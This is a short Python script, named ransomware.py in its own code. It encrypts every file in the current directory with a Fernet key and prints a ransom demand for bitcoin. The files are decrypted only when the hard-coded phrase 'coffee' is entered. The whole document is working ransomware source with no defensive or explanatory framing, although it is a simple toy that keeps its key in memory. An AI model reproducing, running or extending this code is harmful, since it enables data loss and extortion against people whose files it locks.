import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
files = [
    file for file in os.listdir() if file != "ransomware.py" and os.path.isfile(file)
]


def encrypt():
    print("Encrypting files...\n")

    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file, "wb") as f:
            f.write(encrypted_data)
    print("All of your files have been encrypted! Send me bitcoin to unlock them.")


def decrypt():
    print("Decrypting files...\n")

    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        decrypted_data = Fernet(key).decrypt(data)
        with open(file, "wb") as f:
            f.write(decrypted_data)
    print("All your files have been decrypted!")


encrypt()
secret_phrase = "coffee"

while True:
    print(f"Enter the secret phrase to decrypted your files:")
    user_input = input()

    if user_input == secret_phrase:
        decrypt()
        break
    else:
        print("\nIncorrect phrase.")
        continue
